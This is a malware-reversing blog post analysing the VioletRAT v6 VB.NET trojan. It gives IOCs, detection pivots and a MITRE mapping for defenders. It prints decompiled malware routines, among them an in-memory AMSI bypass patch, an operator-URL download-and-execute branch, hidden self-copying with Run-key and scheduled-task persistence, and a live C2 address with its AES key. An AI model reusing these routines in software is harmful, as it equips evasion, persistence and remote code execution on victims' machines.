---
title: "VioletRAT v6: A WinRAR-Spoofed VB.NET RAT With a 110-Command C2"
permalink: /blog/violetrat-v6-winrar-vbnet-rat/
date: 2026-06-25 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [violetrat, violetworm, vbnet, dotnet, rat, clipper, keylogger, ddos, amsi-bypass, plugin-loader, aes-ecb, yara, amadey, c2]
description: "Static teardown of VioletRAT v6 (VioletWorm), a VB.NET commodity RAT misclassified as AsyncRAT. Recovers the Base64+XOR string layer, the AES-128-ECB C2 protocol, embedded C2 195.63.145[.]169:7000, the ~110-command dispatcher, and an in-memory AMSI bypass. Ships an offline decoder, a capture-only C2 client, and four YARA rules."
image:
  path: /assets/images/social/violetrat-card.png
  alt: "VioletRAT v6 -- WinRAR-spoofed VB.NET RAT"
---

> **Downloads:** all artifacts for this post are mirrored at [taogoldi/analysis_data/violetrat_june_2026](https://github.com/taogoldi/analysis_data/tree/main/violetrat_june_2026). The YARA rules are also available at [taogoldi/YARA/rats/violetrat](https://github.com/taogoldi/YARA/tree/main/rats/violetrat). A full download index is at [/downloads/violetrat/]({{ site.baseurl }}/downloads/violetrat/).

A sample landed in the triage queue this week that the in-house classifier tagged as AsyncRAT. It is not AsyncRAT. AsyncRAT is C#; this binary is VB.NET, it spoofs WinRAR in its version resource, and it carries its own name in plaintext once you peel one layer of obfuscation: `Violet v6`. This is VioletRAT (also tracked as VioletWorm), a commodity remote-access toolkit sold on hacking forums. Public analysis I found during this review focused on VioletWorm/VioletRAT v4.7. This sample self-identifies as Violet v6; its compile timestamp (2026-06-20) and recent submission provenance make it appear to be a live, recent build rather than an old recycled artifact. This post walks the obfuscation, recovers the embedded C2 and the full 110-entry command table, and ships YARA coverage that survives the per-build renamer.

## Key Findings

- The classifier label `asyncrat` is incorrect. The binary is VB.NET; AsyncRAT is C#. The sample self-identifies as `Violet v6` through its own obfuscation layer.
- String layer: Base64 + XOR with key `TFiIJrP`. Recoverable offline without executing the sample.
- Packet layer: AES-128-ECB keyed by `MD5(password)`, default password `XSXSXSX`, default key `679bcea2b6c93957139ca6893dbd7ece`.
- Embedded C2: `195.63.145.169:7000` (raw TCP; reachable during the live probe, then unreachable in a follow-up check roughly 12 minutes later).
- The dispatcher exposes approximately 110 command branches spanning remote shell, file manager, keylogger, clipper, DDoS flood, ransomware, HVNC, worm, and ngrok.
- Heavy capability modules appear to be operator-pushed .NET assemblies loaded at runtime after an in-memory AMSI bypass; the stub contains handlers for these capabilities, but the plugin payloads themselves were not captured.
- Best static detection anchors: `<Violet>` field separator, the `Cilpper` typo, WinRAR version-resource spoof, mutex `vzOrETV8nZcIYnJA`, `WindowsDefender` Run key value, `amsi.dll` and `AmsiScanBuffer` in cleartext adjacent to `VirtualProtect`. The YARA section includes four rules tested against the reference sample.

## Sample Properties

| Property | Value |
|---|---|
| SHA256 | `2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb` |
| MD5 | `486063249f6b355cf0a50e7c2eb76445` |
| Size | 70,656 bytes |
| Type | PE32 executable (GUI), .NET assembly, VB.NET |
| ImpHash | `f34d5f2d4577ed6d9ceec516c1f5a744` (single managed import) |
| Compile timestamp | 2026-06-20 23:43:03 UTC |
| Version (spoofed) | WinRAR 7.22.0.0, CompanyName "Alexander Roshal" |
| Internal name | `antimalwaver.exe` |
| Exports | none |

The compile timestamp is recent. Compile timestamps can be tampered with, but the submission provenance and the version self-stamp together corroborate this as a recent build rather than a recycled artifact.

## Getting the Sample

The sample was pulled from the threat-intel platform's last-24h queue, where it sat at the top of the capa risk ranking (score 100, `needs_investigation=true`). The in-house pe_sentinel classifier predicted `backdoor / asyncrat / CRITICAL`. That `asyncrat` label was the starting hypothesis, not the verdict, and it turned out to be wrong (see Observations).

The MalwareBazaar submission for this hash (uploader Bitsight, file name `file`) is tagged `dropped-by-Amadey`, and public loader-tracking feeds place its distribution behind an Amadey loader, delivered as `DsL2jed.exe` from `hxxp://62.60.226[.]140/files/7726345600/DsL2jed.exe`. Amadey is a downloader / loader that commonly fans out second-stage payloads; this VioletRAT v6 is one such payload. That distribution chain is external to the binary and cannot be confirmed from the file alone, so it is recorded as observed provenance rather than a static finding. Triage (Hatching) had two reports for the same MVID lineage (`260620-31ea5sbt5w`, `260621-aa84lsav2j`) tagged only with generic `execution` / `persistence` behavior and no family config extracted, which is itself a tell that the static config extractor did not recognize the layout.

Family validation was therefore done from the binary outward rather than from a single classifier:

1. The decompiled assembly contains the literals `Violet v6` and `<Violet>` after one deobfuscation pass (builder self-stamp).
2. The binary is VB.NET with `Microsoft.VisualBasic` as a first-class dependency, matching the documented VioletRAT/VioletWorm profile and ruling out AsyncRAT/DcRAT/VenomRAT/Quasar (all C#).
3. The capability fingerprint (crypto clipper, online/offline keylogger, HVNC, ransomware verbs, ngrok tunnel, plugin loader) matches the public VioletRAT description.

Three independent lines converge on VioletRAT v6. The `asyncrat` machine label is best treated as a generic .NET-RAT guess, and the VB.NET implementation plus the Violet self-stamp argue strongly against carrying that label forward.

## Scope and Non-Claims

- This post does not claim the sample is AsyncRAT; that was only the initial automated classifier label, which the analysis disproves.
- The sample is identified as VioletRAT v6 on the strength of three independent signals (self-stamp, language, capability fingerprint), not on a single tool verdict.
- Plugin payloads were not captured. No browser or wallet target list is claimed from this stub.
- Distribution via Amadey is treated as observed provenance, not a static property of the binary.
- The live C2 probe was capture-only. The script did not execute any received command, start a process, or load a received assembly.

## First-Pass Static Analysis

`pefile` shows a small, clean managed PE. Three sections, the only import is `mscoree.dll!_CorExeMain`, and entropy is low (no PE-level packer):

| Section | VirtSize | RawSize | Entropy |
|---|---|---|---|
| .text | 67,604 | 68,096 | 5.560 |
| .rsrc | 1,470 | 1,536 | 4.148 |
| .reloc | 12 | 512 | 0.102 |

The version resource is a WinRAR masquerade: CompanyName `Alexander Roshal`, ProductName `WinRAR`, FileVersion `7.22.0.0`, copyright `1993-2026`. The internal and original filename, however, is `antimalwaver.exe`, and the on-disk drop name is `svchost.exe`. The low `.text` entropy is misleading: there is no packer, but most configuration and command strings are obfuscated in the #US heap.

The assembly is renamer-obfuscated. Namespaces and identifiers are random (`BrYLzJkGKK6nVUka2DGz`, `jScdOHxfiZi2eeL3WWBA`, and so on). Many public and upstream AsyncRAT samples are not heavily renamed, so the obfuscation was an early hint that this was a builder-produced fork rather than the upstream project.

## Obfuscation and Configuration

VioletRAT v6 uses two distinct crypto layers. Document them separately; conflating them is the easiest way to mis-state the C2 protocol.

### Layer 1: config and UI strings (Base64 + XOR)

Static strings are stored as Base64, decoded at runtime by method `UWiacKqtEeAk8xm0l9y6`:

1. Base64-decode the literal.
2. XOR each byte against the repeating key `TFiIJrP` (7 bytes).
3. Interpret as UTF-8.

The inverse (`tqVnbzObEtjrCHvgxWR8`, XOR then Base64) is reused in the command dispatcher, which matters below.

The decompiled routine, with the obfuscated names renamed, is short enough to read directly (the XOR key `TFiIJrP` is itself stored Base64-encoded as `VEZpSUpyUA==`):

```csharp
// UWiacKqtEeAk8xm0l9y6  ->  DecodeString
public static string DecodeString(string encryptedText)
{
    string key = Encoding.UTF8.GetString(Convert.FromBase64String("VEZpSUpyUA==")); // "TFiIJrP"
    List<char> outChars = new List<char>();
    int k = 0;
    byte[] data = Convert.FromBase64String(encryptedText);
    foreach (byte b in data)
    {
        outChars.Add((char)(byte)(b ^ (byte)key[k]));
        k = (k + 1) % key.Length;
    }
    return new string(outChars.ToArray());
}
```

The embedded config decodes cleanly:

| Field | Decoded value |
|---|---|
| C2 host | `195.63.145.169` |
| C2 port | `7000` |
| Field separator / tag | `<Violet>` |
| Default AES password | `XSXSXSX` |
| Mutex | `vzOrETV8nZcIYnJA` |
| Install folder | `%AppData%\Microsoft\Windows` |
| Drop name | `svchost.exe` |
| Run key value | `WindowsDefender` |
| Service/mutex label | `WindowsAntimalware` |

The same layer also hides a six-entry modern User-Agent pool (Chrome 117, Firefox 63, iPhone/iPad Safari, Linux Chrome) used by the HTTP flood module, separate from a large legacy Internet-Explorer/AOL User-Agent table that is also present in the binary.

### Layer 2: C2 packet body (AES-128-ECB)

The network body is encrypted with `RijndaelManaged` in **ECB** mode. The key is `MD5(password)`, where the password defaults to `XSXSXSX` before the handshake and may be overwritten by field [3] of the C2 handshake response; builds that never rotate the key remain decryptable with the default. Default key:

```
MD5("XSXSXSX") = 679bcea2b6c93957139ca6893dbd7ece
```

The encrypt and decrypt routines are a matched pair; only the transform direction differs:

```csharp
// k6AyXbKjInTH77jWVqnj / 8lNwHV9kOKgtx8sfGK22  ->  AesEcbEncrypt / AesEcbDecrypt
public static byte[] AesEcbDecrypt(byte[] input)
{
    var aes = new RijndaelManaged();
    var md5 = new MD5CryptoServiceProvider();
    aes.Key  = md5.ComputeHash(Encoding.UTF8.GetBytes(AES_Password)); // default "XSXSXSX"
    aes.Mode = CipherMode.ECB;                                        // no IV, no salt
    ICryptoTransform t = aes.CreateDecryptor();
    return t.TransformFinalBlock(input, 0, input.Length);
}
```

Frames are length-prefixed. `SendFrame` (`nTOANE0YWmFXvClHoXuS`) writes an ASCII decimal length plus a `0x00` byte as a header, then the AES ciphertext of the UTF-8 payload:

```csharp
// nTOANE0YWmFXvClHoXuS  ->  SendFrame
byte[] body   = AesEcbEncrypt(Encoding.UTF8.GetBytes(msg));
byte[] header = Encoding.UTF8.GetBytes(body.Length.ToString() + "\0");
stream.Write(header, 0, header.Length);
stream.Write(body,   0, body.Length);
socket.BeginSend(stream.ToArray(), ...);
```

On receive, the dispatcher AES-decrypts, splits the plaintext on the `<Violet>` separator into a field array, and treats field [0] as the command.

![String and packet crypto](/assets/images/posts/violetrat/string_decrypt.png)

### The command dispatcher (110 branches)

The dispatcher does not compare the received command to plaintext. It runs the received command word back through the Layer-1 encoder (`tqVnbzObEtjrCHvgxWR8`, XOR + Base64) and compares the result to approximately 110 hard-coded encoded command constants. In other words, the malware does not store command names in cleartext anywhere in the binary; it stores the encoded form of each command, then encodes the inbound command before comparing. For example, the encoded constant `Rnk4Rk9Ub1hJZz09` decodes back to the misspelled command `Cilpper`.

```csharp
// hHi74FtsuJoo3fm6XL02  ->  DispatchCommand
public static void DispatchCommand(byte[] b)
{
    // AES-decrypt, UTF-8 decode, split on the "<Violet>" separator
    string[] fields = Strings.Split(Utf8(AesEcbDecrypt(b)), Separator); // Separator = "<Violet>"
    string cmd = EncodeString(fields[0]);                               // XOR + Base64 of the command word

    if (cmd == "JiMK")        { Uninstall(); Application.Restart(); }     //  decodes to "rec"
    if (cmd == "RndvbUdnOD0=") { socket.Shutdown(); Environment.Exit(0);} //  "CLOSE"
    if (cmd == "SVNnQUp6a0dNVGdx") { LoadPlugin(fields[1]); }            //  "uninstall"
    // ... ~110 branches total ...
}
```

So the encoded command constants are `Base64(XOR("TFiIJrP", command))`. To recover a command name, take the constant, Base64-decode it, and XOR with `TFiIJrP`. Doing that across the dispatcher yields the full v6 command set. A representative selection:

| Code | Action |
|---|---|
| `getinfo`, `botinfo`, `bot`, `admin` | victim enumeration / tasking |
| `runcmnd`, `shellfuc`, `closeshell`, `openhide` | remote shell |
| `FM`, `FFM`, `FLA`, `MFrm`, `WL`, `DelP` | file manager |
| `KL`, `closeKL`, `KLget`, `KLGET` | keylogger (online and offline) |
| `Cilpper` | crypto clipboard hijack (note the builder's typo) |
| `DDosS`, `DDosT` | HTTP POST flood start / stop |
| `HVNC`, `HvNcX`, `hvncxdis`, `vhvncs`, `hdp`, `hdpf` | hidden desktop / VNC |
| `VCAM`, `MICL`, `syssound`, `VMap` | webcam, mic, audio, screen |
| `RENC`, `RDEC` | ransomware encrypt / decrypt |
| `DBGrabber`, `AESGrabber`, `CookieST`, `coki`, `GrabberDC`, `Email` | browser DB / Chrome AES-key / cookie / Discord / email grabbers (plugin) |
| `FakeLoginSt` | fake-login phishing overlay |
| `WDKillerNew`, `WDPL`, `askuac`, `AntiiReset` | Defender kill, UAC prompt, anti-reset |
| `BSOD`, `blkscr`, `stpblk`, `JustFun` | prankware / coercion |
| `wormer`, `ngrok`, `InstallN`, `NETINS`, `NetDisCV` | USB worm, ngrok tunnel, install, network discovery |
| `update`, `uninstall`, `rec`, `CLOSE` | lifecycle |

The full decoded list (110 entries) is in `reports/json/decoded_strings.json`.

### Plugin model

Several heavyweight verbs (the grabbers, HVNC, ransomware) are thin handlers. The stub receives a Base64-encoded .NET assembly over the C2 channel and runs it in memory. Critically, it patches AMSI first, so the plugin is never scanned:

```csharp
// KuKJwd9HfSswZB0E0mhI  ->  AmsiBypassAndLoadPlugin
IntPtr p = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
if (p != IntPtr.Zero) {
    uint old = 0;
    VirtualProtect(p, 6, 0x40 /* PAGE_EXECUTE_READWRITE */, ref old);
    Marshal.Copy(new byte[6] { 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90 }, 0, p, 6); // ret; nop x5
}
byte[] rawAssembly = Convert.FromBase64String(base64Exe);
Assembly asm = Assembly.Load(rawAssembly);
asm.EntryPoint.Invoke(null, asm.EntryPoint.GetParameters().Length == 1
                            ? new object[] { new string[0] } : new object[0]);
```

The patch overwrites the first six bytes of `AmsiScanBuffer` with `0xC3` (`ret`) and five `0x90` (`nop`), so the function returns immediately and never reports `AMSI_RESULT_DETECTED`. The AMSI-related strings `amsi.dll` and `AmsiScanBuffer` are not obfuscated; they sit in the #US heap as UTF-16LE alongside a `VirtualProtect` P/Invoke, which together are a strong static indicator. (See the `VioletRAT_v6_amsi_bypass` YARA rule.)

The on-disk stub is the dispatcher and a set of built-in modules; the browser/wallet/Discord theft code is delivered as AMSI-shielded plugin assemblies at runtime and is not resident in this sample.

### Bot ID / HWID

The victim identifier is an MD5 over a handful of environment values, hex-encoded:

```csharp
// E5zfOsATPINwvaqpGLkG  ->  GenerateHwid
string raw = ProcessorCount.ToString() + UserName + MachineName
           + OSVersion.ToString() + new DriveInfo(systemRoot).TotalSize.ToString();
string hwid = Md5Hex(raw);   // falls back to the string "Err HWID" on exception
```

This is a weak fingerprint: it is stable per machine but trivial to predict and collides across cloned VMs with the same username and disk size, which is convenient for sandbox correlation.

### Re-implementing the decoder (offline emulation)

Because the string layer is a pure function of two static constants (the XOR key and the Base64 alphabet), it can be re-implemented and run offline against the embedded config blobs without ever executing the sample. The C2 globals (`F1WT57aaWA9fgxMDLXH2`, `HEiU7Zw9prHNVbm9C1Kc`) are themselves Base64 of the Layer-1 blob, so the recovery is a double Base64 plus the XOR:

```python
import base64, hashlib
XOR_KEY = b"TFiIJrP"

def decode_string(b64):                       # ports UWiacKqtEeAk8xm0l9y6
    raw = base64.b64decode(b64)
    return bytes(c ^ XOR_KEY[i % len(XOR_KEY)]
                 for i, c in enumerate(raw)).decode("utf-8", "replace")

# embedded config globals (global = Base64 of the layer-1 blob string)
for name, blob in [("C2 host", "Wlg5Y1ozeEJmbVZ5WEdkN1JHaz0="),
                   ("C2 port", "WTNaWmVRPT0=")]:
    inner = base64.b64decode(blob).decode()   # -> the layer-1 blob
    print(name, "=", decode_string(inner))

print("AES key =", hashlib.md5(b"XSXSXSX").hexdigest())
```

Output, matching the values the running stub would compute:

```
C2 host = 195.63.145.169
C2 port = 7000
AES key = 679bcea2b6c93957139ca6893dbd7ece
```

The same routine, applied to the approximately 110 encoded command constants, recovers the entire command table. The full implementation is in `scripts/decoder.py` and the decoded output in `reports/json/decoded_strings.json`.

## Execution and Persistence

The startup path is plain VB.NET once the strings are decoded. The routines below are the decompiled methods with the obfuscated identifiers renamed; the logic and API calls are unchanged.

A single-instance guard keys off the static mutex `vzOrETV8nZcIYnJA`:

```csharp
// 0aMliNqxujqXNQBUxmJc  ->  AcquireSingleInstance
public static bool AcquireSingleInstance()
{
    SingleInstanceMutex = new Mutex(initiallyOwned: false, MutexName, out bool createdNew);
    return createdNew;                 // MutexName = "vzOrETV8nZcIYnJA"
}
```

There are two persistence mechanisms, and the sample installs both. The first is a registry Run key that points at a hidden copy in `%AppData%`:

```csharp
// 2dufu09LZYsFnE3USkNd  ->  InstallRunKeyPersistence
string runKey   = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
string runValue = "WindowsDefender";
string subDir   = "Microsoft\\Windows";
string dropName = "svchost.exe";

string dir = Path.Combine(GetFolderPath(SpecialFolder.ApplicationData), subDir); // %AppData%\Microsoft\Windows
string dst = Path.Combine(dir, dropName);                                        // ...\svchost.exe
Directory.CreateDirectory(dir);
if (!File.Exists(dst) || !SameHash(SelfModulePath, dst)) {
    File.Copy(SelfModulePath, dst, overwrite: true);
    File.SetAttributes(dst, FileAttributes.Hidden | FileAttributes.System);
}
using RegistryKey rk = Registry.CurrentUser.OpenSubKey(runKey, writable: true);
rk?.SetValue(runValue, dst, RegistryValueKind.String); // HKCU\...\Run  "WindowsDefender" = dst
```

The second copies the binary into five directories and registers one scheduled task per copy. The task names are not fixed: the builder ships a pool of 20 plausible "updater" names and shuffles them with a `Random` seeded by the host fingerprint, so the chosen names are deterministic per machine but vary across victims. Each task runs every minute:

```csharp
// install routine  ->  InstallScheduledTasks
string[] dirs = { Environ("temp"), Environ("appdata"), Environ("localappdata"),
                  GetFolderPath(SpecialFolder.CommonApplicationData), Environ("windir") + "\\Temp" };
string[] decoys = { "EdgeUpdate","GoogleUpdate","OneDriveSync","AdobeUpdate","CCleanerUpdate",
                    "DropboxUpdate","NvUpdate","AMDUpdate","iTunesUpdate","ZoomUpdate","DiscordUpdate",
                    "TeamViewerUpdate","LogiUpdate","SamsungUpdate","SpotifyUpdate","SteamUpdate",
                    "SkypeUpdate","SlackUpdate","WhatsAppUpdate","VLCUpdate" };

var rng = new Random(Math.Abs(GenerateHwid().GetHashCode()));  // host-seeded
FisherYatesShuffle(decoys, rng);
for (int j = 0; j < dirs.Length; j++) {
    string dst = dirs[j] + "\\" + Path.GetFileName(SelfModulePath);
    File.Copy(SelfModulePath, dst, overwrite: true);
    File.SetAttributes(dst, FileAttributes.Hidden | FileAttributes.System);
    Process.Start(new ProcessStartInfo("schtasks.exe") {
        WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = false,
        Arguments = "/create /f /sc minute /mo 1 /tn \"" + decoys[j] + "\" /tr \"" + dst + "\""
    }).WaitForExit();
}
```

So a clean box ends up with a hidden `%AppData%\Microsoft\Windows\svchost.exe` plus up to five more hidden copies, a `WindowsDefender` Run value, and five minute-interval scheduled tasks masquerading as software updaters.

## Secondary Payloads and Downloads

A natural follow-up is what this RAT pulls down next. For this build, nothing is fetched from a hard-coded address: there is no embedded second-stage URL anywhere in the binary. Secondary code arrives only at the operator's direction, by two paths.

**In-band plugins.** The grabbers, HVNC, and ransomware verbs are delivered as .NET assemblies pushed over the encrypted C2 channel; the technical loader is described in the Plugin Model section above. Because plugins arrive in-band rather than from a separate URL, they cannot be fetched or enumerated statically. What the operator actually pushes depends entirely on the active campaign.

**Operator-directed download-and-execute.** One dispatcher branch (`GAg=`) runs a classic drop-and-run where both the filename and the URL come from the C2 message:

```csharp
// dispatcher branch "GAg="  ->  DownloadAndExecute
string fileName = Path.GetTempFileName() + "-" + fields[1];
new WebClient().DownloadFile(fields[2], fileName);   // fields[2] = operator-supplied URL
Process.Start(fileName);
```

Upstream, this sample is itself the secondary payload: it is the file the Amadey loader drops as `DsL2jed.exe`. The chain we can document statically is therefore Amadey to this VioletRAT v6; the next hop (a plugin or a tasked download) is decided live by whoever operates `195.63.145.169:7000`. We did attempt to capture one by emulating a bot against the live C2; that attempt and its outcome are in the "Live C2 Probe" section below.

## Kill Chain

![Kill chain flowchart](/assets/images/posts/violetrat/killchain.png)

1. `antimalwaver.exe` launches, presenting WinRAR 7.22 version metadata.
2. Single-instance guard via the mutex `vzOrETV8nZcIYnJA`; it also checks for a sibling process named `WinSc32`.
3. Copies itself to `%AppData%\Microsoft\Windows\svchost.exe` (hidden + system), and into five more directories (`%temp%`, `%appdata%`, `%localappdata%`, ProgramData, `%windir%\Temp`).
4. Establishes two persistence mechanisms: a `Run` key value named `WindowsDefender` pointing at the `svchost.exe` copy, plus five minute-interval scheduled tasks named from a host-seeded shuffle of "updater" decoys (`EdgeUpdate`, `GoogleUpdate`, `OneDriveSync`, and so on).
5. Decodes the embedded config (Base64 + XOR) to recover `195.63.145.169:7000`.
6. Opens a raw TCP socket to the C2 and exchanges length-prefixed frames.
7. Handshake fields are split on `<Violet>`; the C2 may supply a new AES password (default `XSXSXSX`) that keys the rest of the session.
8. Enters the command loop. Each frame body is AES-128-ECB keyed by `MD5(password)`; 110 command branches drive built-in modules and the plugin loader.

## Live C2 Probe

To test the reconstructed protocol and try to capture an operator-pushed plugin, a capture-only client (`scripts/c2_capture.py`) was pointed at `195.63.145.169:7000` through a VPN egress in Canada. The client emulates a freshly-infected bot only as far as registration: it implements the length-prefixed framing, AES-128-ECB with `MD5("XSXSXSX")`, and the `INFO<Violet>...` registration layout, then logs and stores every received frame. By design it never executes a received command, starts a process, or loads a pushed assembly; received bytes are treated as inert and only saved.

The result, on two attempts (placeholder fields, then realistic fields):

- The TCP connection to `:7000` succeeded both times, so the C2 was online.
- The server did not immediately drop the connection after receiving the registration frame, then reset the connection shortly after.
- No tasking and no plugin were delivered.

Two observations follow. First, the consistent behavior across both attempts -- framing accepted, then reset -- suggests the registration frame was at least syntactically acceptable to the service. Because no tasking was returned and the server reset the connection promptly, this should be treated as protocol validation evidence rather than proof of successful bot enrollment. Second, the reset occurring immediately after a registration from a known hosting-ASN egress may reflect source-IP filtering at the C2, but other explanations are equally possible: panel-side bot gating, missing required fields, operator policy, or transient infrastructure behavior. Changing the VPN exit country would not change the ASN classification for a commodity-VPN exit.

About twelve minutes later, a follow-up reachability check found the C2 host completely dark: ports `7000`, `80`, and `443` all timed out and ICMP showed 100 percent loss on every egress tried. The whole VPS, not just the RAT port, had gone offline between the two checks. That short lifetime is consistent with the wider picture: a recent build, single-IP infrastructure with no fallback, and a host cycled or pulled within hours. For defenders, blocking the single C2 IP is effective but time-limited; the IP may disappear or rotate quickly, as this probe demonstrated. The binary-derived markers (mutex, `<Violet>` framing, version spoof, AMSI patch strings) outlast the infrastructure and are the more durable detection anchors. The secondary payloads described above remain operator-tasked and were not captured; they are documented from the binary, not from live tasking.

## Anti-Analysis Notes

- WinRAR version-resource spoof to blend with a trusted installer name on disk and in process lists.
- Drop name `svchost.exe` and Run value `WindowsDefender` to look legitimate in casual triage.
- Per-build renamer obfuscation, so identifier-based signatures will not survive across builds.
- Configuration and most command/UI strings are Base64 + XOR-encoded in the #US heap, defeating naive `strings` triage. The AMSI-related strings `amsi.dll` and `AmsiScanBuffer` are a notable exception -- they sit in cleartext alongside a `VirtualProtect` P/Invoke.
- WMI query `Select * from AntivirusProduct` against `\root\SecurityCenter2` to enumerate installed AV, and a dedicated Defender-killer command (`WDKillerNew`).
- In-memory AMSI bypass before every plugin load: `AmsiScanBuffer` is patched with `0xC3 0x90 0x90 0x90 0x90 0x90` (`ret` + 5 `nop`) via `VirtualProtect`, so C2-pushed assemblies are loaded without being scanned.
- No VM or sandbox checks were found in the stub; evasion is delegated to operator-pushed plugins.

## Observations & Attribution Notes

- The machine classifier's `asyncrat` label is a generic .NET-RAT guess. The binary is VB.NET and self-identifies as Violet, so the label was rejected per the validation rule rather than carried into the write-up. Independent public trackers reach the same VioletRAT verdict (one tags the sample `violet` / `rat` / `amsi-bypass` directly), so the in-house mislabel is the outlier, not the call made here.
- Distribution is via the Amadey loader (dropper `DsL2jed.exe`, `62.60.226[.]140`). Amadey-into-commodity-RAT is a common pay-per-install pattern, consistent with a newly stood-up VioletRAT panel being seeded through an established Amadey distribution network.
- `Violet v6` is newer than the publicly analyzed v4.7. The command surface here (110 branches) is consistent with the "around 120 commands" described for VioletWorm, suggesting steady feature accretion across versions rather than a rewrite.
- The C2 `195.63.145.169:7000` had no public reputation hits at analysis time, consistent with newly stood-up infrastructure.
- The `Cilpper` misspelling is a stable builder artifact and is useful as a low-effort hunting string in decoded traffic and memory.

## Code Weaknesses

- AES in **ECB** mode: identical plaintext blocks produce identical ciphertext blocks, so repeated command structure is visible on the wire even without the key.
- The session key is `MD5(password)` with a known default password `XSXSXSX`; builds that never rotate the password are trivially decryptable (`679bcea2b6c93957139ca6893dbd7ece`).
- A single hard-coded C2 with no fallback list; sinkhole or block `195.63.145.169:7000` and the bot is mute.
- The string-layer XOR key `TFiIJrP` is static and embedded, so all config and encoded command constants are recoverable offline.
- The AMSI bypass uses a fixed 6-byte patch (`C3 90 90 90 90 90`) and leaves the strings `amsi.dll` and `AmsiScanBuffer` in cleartext next to a `VirtualProtect` import, a high-signal static and behavioral tell.
- The `<Violet>` field separator doubles as a family tag and appears in every decoded frame, a reliable network and memory marker.
- WinRAR version spoof paired with internal name `antimalwaver.exe` is internally inconsistent and stands out under version-info inspection.
- Mutex `vzOrETV8nZcIYnJA` is constant in this build and supports host-based one-shot detection.
- Run key value `WindowsDefender` pointing at `%AppData%\...\svchost.exe` is a high-signal autoruns anomaly.
- Builder typo `Cilpper` is a durable string fingerprint.

## IOC Appendix

### Network
- C2: `195.63.145[.]169:7000` (raw TCP, AES-ECB body, `<Violet>`-delimited frames)
- Frame marker: ASCII length + `0x00` header followed by AES ciphertext
- HTTP flood User-Agent pool: Chrome 117, Firefox 63, iPhone/iPad Safari, Linux Chrome (see `reports/json/decoded_strings.json`)
- Distribution (Amadey loader, observed provenance): `hxxp://62.60.226[.]140/files/7726345600/DsL2jed.exe`

### File / Registry
- Primary drop: `%AppData%\Microsoft\Windows\svchost.exe` (Hidden + System)
- Additional copies: `%temp%`, `%appdata%`, `%localappdata%`, `%ProgramData%`, `%windir%\Temp` (each Hidden + System, original filename)
- Run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value `WindowsDefender`
- Scheduled tasks: `schtasks /create /f /sc minute /mo 1 /tn "<name>" /tr "<copy>"`, five tasks; `<name>` from the decoy pool: EdgeUpdate, GoogleUpdate, OneDriveSync, AdobeUpdate, CCleanerUpdate, DropboxUpdate, NvUpdate, AMDUpdate, iTunesUpdate, ZoomUpdate, DiscordUpdate, TeamViewerUpdate, LogiUpdate, SamsungUpdate, SpotifyUpdate, SteamUpdate, SkypeUpdate, SlackUpdate, WhatsAppUpdate, VLCUpdate
- Mutex: `vzOrETV8nZcIYnJA`
- Sibling-process check: `WinSc32`
- Version spoof: WinRAR 7.22.0.0 / Alexander Roshal, internal name `antimalwaver.exe`

### Hashes
- SHA256: `2bf04b9a583e6f1efa661a43d357bc8ea143bcb53fa87f81081347ee2feb80eb`
- MD5: `486063249f6b355cf0a50e7c2eb76445`
- ImpHash: `f34d5f2d4577ed6d9ceec516c1f5a744`

### Detection Pivots

The C2 IP is short-lived; hunt on the more durable indicators below:

- Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value `WindowsDefender` pointing into `%AppData%`.
- Scheduled tasks: tasks configured with `/sc minute /mo 1` running executables from user-writable locations (`%appdata%`, `%temp%`, `%localappdata%`, `%ProgramData%`, `%windir%\Temp`).
- Process memory / behavioral: .NET processes that call `VirtualProtect` on an `amsi.dll` export followed by `Assembly.Load` within the same thread.
- Version-info anomaly: PE files reporting WinRAR / Alexander Roshal company metadata but with an internal name other than `WinRAR.exe` or `WinRAR64.exe`.
- Memory / string hunt: `<Violet>`, `Violet v6`, `XSXSXSX`, `TFiIJrP`, `Cilpper`, `vzOrETV8nZcIYnJA`.
- Network: raw TCP sessions to `195.63.145[.]169:7000`; note the IP is short-lived. An ECB-block-repetition heuristic on raw TCP flows can surface the AES-ECB pattern independently of the specific endpoint.

## MITRE ATT&CK Mapping

The mapping below is limited to behavior observed in the stub or directly represented by command handlers; entries that depend on a plugin payload not resident in the analyzed file are marked "(plugin)" in the evidence column.

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Defense Evasion | Masquerading: Match Legitimate Name | T1036.005 | WinRAR version spoof, drop name `svchost.exe` |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 + XOR strings, AES-ECB packets, renamer |
| Persistence | Registry Run Key | T1547.001 | `Run` value `WindowsDefender` |
| Execution / Persistence | Scheduled Task | T1053.005 | `schtasks /sc minute /mo 1` |
| Execution | Command and Scripting Interpreter | T1059 | `runcmnd` / `shellfuc` remote shell |
| Execution | Reflective Code Loading | T1620 | `Assembly.Load` + `EntryPoint.Invoke` plugin loader |
| Defense Evasion | Disable or Modify Tools | T1562.001 | `WDKillerNew` Defender kill, AV WMI enumeration |
| Defense Evasion | Disable or Modify Tools: AMSI | T1562.001 | `AmsiScanBuffer` patched `ret;nop` via `VirtualProtect` before plugin load |
| Privilege Escalation | Bypass User Account Control | T1548.002 | `askuac` UAC prompt command |
| Collection | Input Capture: Keylogging | T1056.001 | `KL` / `KLget` online and offline keylogger |
| Collection | Video / Audio Capture | T1125 / T1123 | `VCAM`, `MICL`, `syssound` |
| Credential Access | Credentials from Browsers (plugin) | T1555.003 | `DBGrabber`, `AESGrabber`, `CookieST` |
| Collection | Clipboard Data | T1115 | `Cilpper` crypto clipboard hijack |
| Impact | Data Encrypted for Impact | T1486 | `RENC` / `RDEC` ransomware verbs |
| Impact | Network Denial of Service | T1498 | `DDosS` / `DDosT` HTTP POST flood |
| Lateral Movement | Replication Through Removable Media | T1091 | `wormer` USB spread, `%usb%` token |
| Command and Control | Protocol Tunneling | T1572 | `ngrok` tunnel command |
| Command and Control | Encrypted Channel: Symmetric | T1573.001 | AES-128-ECB session body |

## YARA Rules

| Rule | Signal | Fidelity |
|---|---|---|
| `VioletRAT_v6_strings` | `<Violet>` / `Violet v6` / `XSXSXSX` / `TFiIJrP` Base64 markers (UTF-16LE) + VB.NET | High |
